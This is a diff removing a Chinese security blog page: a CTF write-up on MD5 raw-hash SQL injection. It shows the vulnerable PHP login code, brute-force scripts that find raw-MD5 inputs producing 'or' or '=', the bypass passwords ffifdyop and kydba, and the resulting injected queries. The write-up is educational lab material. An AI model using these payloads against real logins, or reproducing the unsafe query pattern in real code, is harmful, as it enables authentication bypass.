@@ -1,476 +1,0 @@
-<!DOCTYPE html>
-<html lang="en-us">
-    <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='在网上看到一道CTF题目：https://ctf.show/challenges#web9
-打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：
-&amp;lt;?php$flag=&amp;quot;&amp;quot;;$password=$_POST[&#39;password&#39;];if(strlen($password)&amp;gt;10){die(&amp;quot;password error&amp;quot;);}$sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&amp;gt;0){while($row=mysqli_fetch_assoc($result)){echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;echo $flag;}}?&amp;gt;问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。
-第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
-&amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v&#43;&#43;;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
-这里 $v&#43;&#43; 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
-将这个加密回去试试，看到确实是&#39;or&#39;的形式
-那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
-select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!'><title>MD5哈希注入</title>
-
-<link rel='canonical' href='https://example.com/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/'>
-
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='MD5哈希注入'>
-<meta property='og:description' content='在网上看到一道CTF题目：https://ctf.show/challenges#web9
-打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：
-&amp;lt;?php$flag=&amp;quot;&amp;quot;;$password=$_POST[&#39;password&#39;];if(strlen($password)&amp;gt;10){die(&amp;quot;password error&amp;quot;);}$sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&amp;gt;0){while($row=mysqli_fetch_assoc($result)){echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;echo $flag;}}?&amp;gt;问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。
-第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
-&amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v&#43;&#43;;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
-这里 $v&#43;&#43; 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
-将这个加密回去试试，看到确实是&#39;or&#39;的形式
-那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
-select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!'>
-<meta property='og:url' content='https://example.com/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/'>
-<meta property='og:site_name' content='wh1sper'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' />
-<meta name="twitter:title" content="MD5哈希注入">
-<meta name="twitter:description" content="在网上看到一道CTF题目：https://ctf.show/challenges#web9
-打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：
-&amp;lt;?php$flag=&amp;quot;&amp;quot;;$password=$_POST[&#39;password&#39;];if(strlen($password)&amp;gt;10){die(&amp;quot;password error&amp;quot;);}$sql=&amp;quot;select * from user where username =&#39;admin&#39; and password =&#39;&amp;quot;.md5($password,true).&amp;quot;&#39;&amp;quot;;$result=mysqli_query($con,$sql);if(mysqli_num_rows($result)&amp;gt;0){while($row=mysqli_fetch_assoc($result)){echo &amp;quot;登陆成功&amp;lt;br&amp;gt;&amp;quot;;echo $flag;}}?&amp;gt;问题出在第7行md5($password,true)，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。
-第一种方法是将加密后的密码构造出类似 &#39; or &amp;lsquo;1&amp;rsquo; 的形式
-&amp;lt;?php$v = &#39;a&#39;;$payload2 = &amp;quot;&#39;or&#39;&amp;quot;;while(1){$hash = hash(&amp;quot;md5&amp;quot;,$v,true);if(substr_count($hash, $payload2) == 1){die($v); }$v&#43;&#43;;}?&amp;gt;这是网上的脚本不过我倒是没跑出来。。。
-这里 $v&#43;&#43; 其实是按照 ascii 字符进行后移的；
-最后可以得到一个结果 ffifdyop
-将这个加密回去试试，看到确实是&#39;or&#39;的形式
-那么只要我们随意输入一个用户名，密码为 ffifdyop 那么这样我们的语句就变成了：
-select * from users where user = &#39;admin&#39; and password = &#39;&#39;or&#39;6蒥欓!">
-    </head>
-    <body class="">
-    <script>
-        (function() {
-            const colorSchemeKey = 'StackColorScheme';
-            if(!localStorage.getItem(colorSchemeKey)){
-                localStorage.setItem(colorSchemeKey, "auto");
-            }
-        })();
-    </script><script>
-    (function() {
-        const colorSchemeKey = 'StackColorScheme';
-        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
-        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
-
-        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
-            
-
-            document.body.dataset.scheme = 'dark';
-        } else {
-            document.body.dataset.scheme = 'light';
-        }
-    })();
-</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
-            <aside class="sidebar left-sidebar sticky">
-    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
-        <span class="hamburger-box">
-            <span class="hamburger-inner"></span>
-        </span>
-    </button>
-
-    <header class="site-info">
-        
-            <figure class="site-avatar">
-                
-                    
-                    
-                    
-                        
-                        <img src="/img/avatar_huda2458f72ce188392d75c5d51cd8e24e_373_300x0_resize_box_2.png" width="300"
-                            height="300" class="site-logo" loading="lazy" alt="Avatar">
-                    
-                
-
-                
-                    <span class="emoji">🍥</span>
-                
-            </figure>
-        
-        <h1 class="site-name"><a href="https://example.com">wh1sper</a></h1>
-        <h2 class="site-description">专注Web安全</h2>
-    </header>
-
-    <ol class="menu" id="main-menu">
-        
-        
-        
-
-        <li >
-            <a href='/about'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="7" r="4" />
-  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
-</svg>
-
-
-
-                
-                <span>About</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/archives'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <rect x="3" y="4" width="18" height="4" rx="2" />
-  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
-  <line x1="10" y1="12" x2="14" y2="12" />
-</svg>
-
-
-
-                
-                <span>Archives</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="5 12 3 12 12 3 21 12 19 12" />
-  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
-  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
-</svg>
-
-
-
-                
-                <span>Home</span>
-            </a>
-        </li>
-        
-        
-
-        <li >
-            <a href='/search'>
-                
-                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
-
-
-
-                
-                <span>Search</span>
-            </a>
-        </li>
-        
-
-        
-            <li id="dark-mode-toggle">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="8" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="16" cy="12" r="2" />
-  <rect x="2" y="6" width="20" height="12" rx="6" />
-</svg>
-
-
-
-                <span>Dark Mode</span>
-            </li>
-        
-    </ol>
-</aside>
-
-            <main class="main full-width">
-    <div id="article-toolbar">
-        <a href="https://example.com" class="back-home">
-            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <polyline points="15 6 9 12 15 18" />
-</svg>
-
-
-
-            <span>Back</span>
-        </a>
-    </div>
-
-    <article class="main-article">
-    <header class="article-header">
-
-    <div class="article-details">
-    
-
-    <h2 class="article-title">
-        <a href="/p/md5%E5%93%88%E5%B8%8C%E6%B3%A8%E5%85%A5/">MD5哈希注入</a>
-    </h2>
-
-    </div>
-</header>
-
-    <section class="article-content">
-    <p>在网上看到一道CTF题目：https://ctf.show/challenges#web9</p>
-<p>打开后扫目录发现robots.txt，里面提示了index.phps，下载，审计，发现MD5哈希注入：</p>
-<pre><code>&lt;?php
-    $flag=&quot;&quot;;
-    $password=$_POST['password'];
-    if(strlen($password)&gt;10){
-      die(&quot;password error&quot;);
-    }
-    $sql=&quot;select * from user where username ='admin' and password ='&quot;.md5($password,true).&quot;'&quot;;
-    $result=mysqli_query($con,$sql);
-    if(mysqli_num_rows($result)&gt;0){
-        while($row=mysqli_fetch_assoc($result)){
-           echo &quot;登陆成功&lt;br&gt;&quot;;
-           echo $flag;
-        }
-    }
-?&gt;
-</code></pre><p>问题出在第7行<code>md5($password,true)</code>，密码使用了 md5 以二进制形式加密后进行在数据库中进行查询，若查询到了数据，就返回成功。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120165922.png" alt="img"  /></p>
-<p>第一种方法是将加密后的密码构造出类似 ' or &lsquo;1&rsquo; 的形式</p>
-<pre><code>&lt;?php
-
-    $v = 'a';
-
-    $payload2 = &quot;'or'&quot;;
-    while(1){
-        $hash = hash(&quot;md5&quot;,$v,true);
-        if(substr_count($hash, $payload2) == 1){
-            die($v);     
-        }
-        $v++;
-    }
-
-?&gt;
-</code></pre><p>这是网上的脚本不过我倒是没跑出来。。。</p>
-<p>这里 <code>$v++</code> 其实是按照 ascii 字符进行后移的；</p>
-<p>最后可以得到一个结果 <code>ffifdyop</code></p>
-<p>将这个加密回去试试，看到确实是<code>'or'</code>的形式</p>
-<p>那么只要我们随意输入一个用户名，密码为 <code>ffifdyop</code> 那么这样我们的语句就变成了：</p>
-<pre><code>select * from users where user = 'admin' and password = ''or'6蒥欓!r,b'
-</code></pre><p>这样就可成功绕过判断。</p>
-<p>还有一个构造的方法是构造 <code>'='</code> 的形式，也就是</p>
-<pre><code>select * from users where user = 'admin' and password = ''=''
-</code></pre><p>为什么这样构造可以呢？因为 <code>password = ''=''</code> 中，先判断 <code>password =''</code> ，这个肯定是返回 0 的，因为 password 中没有<code>''</code>这个字段值，前面返回 0 以后，再和后面的等号做比较：<code>0 = ''</code></p>
-<p>因为后面的根据 php 的弱类型进行判断，0 和字符串比较始终返回 1</p>
-<p>所以整个 sql 语句就相当于：</p>
-<pre><code>select * from users where user = 'admin' and 1
-</code></pre><p>所以与上面的 &lsquo;or&rsquo; 不同的是，这个需要传入一个存在的用户名才可以正常绕过：</p>
-<pre><code>//by wh1sper
-&lt;?php
-
-$v = 'a';
-
-//die(md5('kydba',true));
-
-$payload2 = &quot;'='&quot;;
-while(1){
-    $hash = hash(&quot;md5&quot;,$v,true);
-    if(preg_match(&quot;/^$payload2/i&quot;, $hash)){
-        die($v);
-    }
-    $v++;
-}
-</code></pre><p>得到结果是<code>kydba</code>，加密回去是<code>'='NJ��s��5�z��@</code></p>
-<p>flag{9e92802a-684e-4115-bbe8-f3fdbbf71339}</p>
-
-</section>
-
-
-    <footer class="article-footer">
-    
-
-    
-    <section class="article-copyright">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="12" cy="12" r="9" />
-  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
-</svg>
-
-
-
-        <span>Licensed under CC BY-NC-SA 4.0</span>
-    </section>
-    </footer>
-
-    
-</article>
-
-    <aside class="related-contents--wrapper">
-    
-    
-</aside>
-
-
-    
-        
-    <div class="disqus-container">
-    <div id="disqus_thread"></div>
-<script type="application/javascript">
-    var disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</div>
-
-<style>
-    .disqus-container {
-        background-color: var(--card-background);
-        border-radius: var(--card-border-radius);
-        box-shadow: var(--shadow-l1);
-        padding: var(--card-padding);
-    }
-</style>
-
-<script>
-    window.addEventListener('onColorSchemeChange', (e) => {
-        if (DISQUS) {
-            DISQUS.reset({
-                reload: true
-            });
-        }
-    })
-</script>
-
-    
-
-    <footer class="site-footer">
-    <section class="copyright">
-        &copy; 
-        
-            2020 - 
-        
-        2021 wh1sper
-    </section>
-    
-    <section class="powerby">
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
-    </section>
-</footer>
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-
-    
-    <div class="pswp__bg"></div>
-
-    
-    <div class="pswp__scroll-wrap">
-
-        
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-
-        
-        <div class="pswp__ui pswp__ui--hidden">
-
-            <div class="pswp__top-bar">
-
-                
-
-                <div class="pswp__counter"></div>
-
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-
-                
-                
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                        <div class="pswp__preloader__cut">
-                            <div class="pswp__preloader__donut"></div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div>
-            </div>
-
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-
-        </div>
-
-    </div>
-
-</div><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><script 
-                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
-                defer="true"
-                >
-            </script><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
-            ><link 
-                rel="stylesheet" 
-                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
-            >
-            </main>
-        </div>
-        <script 
-                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
-                defer="false"
-                >
-            </script><script type="text/javascript" src="/ts/main.js" defer></script>
-<script>
-    (function () {
-        const customFont = document.createElement('link');
-        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
-
-        customFont.type = "text/css";
-        customFont.rel = "stylesheet";
-
-        document.head.appendChild(customFont);
-    }());
-</script>
-
-    </body>
-</html>
